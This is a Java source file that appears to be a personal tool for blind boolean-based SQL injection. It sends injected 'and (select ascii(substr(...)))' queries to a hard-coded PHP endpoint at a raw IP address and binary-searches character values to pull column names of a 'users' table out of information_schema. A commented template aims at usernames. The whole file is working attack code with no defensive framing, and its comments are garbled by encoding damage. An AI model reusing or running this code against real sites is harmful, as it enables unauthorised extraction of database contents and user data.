package com.company;

import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

public class Init extends Thread{
//    ?id=1 and (select ascii(substr((select username from users limit x,1),y,1)))=asciiÂë
    String z1="?id=1%20and%20(select%20ascii(substr((select%20" +
            "column_name%20from%20information_schema.columns%20where%20table_name='users'%20limit%20";
    String z3=",1),";
    String z2=",1)))";
    String source="http://82.156.65.6/3.php";//Ä¿±êµØÖ·
    URL url;
    byte[] b;
    int n=-1;
    InputStream in;
    String str="";
    int size;
    String t="True";
    int limit;
    Init(int limit){
        this.limit=limit;
    }
    public  void run()  {
        try {
            init();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    void init() throws Exception {
        this.z1=this.z1+limit;
        String name="";
        String[] bijiao={">","="};
        for(int i=0;i<20;i++){
            int low=33,mid;
            int high=125;
            while (low<=high){
                mid=(low+high)/2;
                if (chack(i,">",mid)==-1){
                    if (chack(i,"=",mid)!=-1){
                        name=name+(char)mid;
                        break;
                    }
                    else {
                        high=mid-1;
                    }
                }
                else {
                    low=mid+1;
                }
            }
        }
        System.out.println("×Ö¶Î"+limit+"£º"+name);
    }
    int chack(int i,String fuhao,int ascii) throws Exception {
        String s=source+z1+z3+i+z2+fuhao+ascii;
        url=new URL(s);
        in = url.openStream();
        b=new byte[1024];
        str="";
        while((n=in.read(b))!=-1){
            str=str+new String(b,0,n);
        }
        size = str.indexOf(t);
        return size;
    }
}
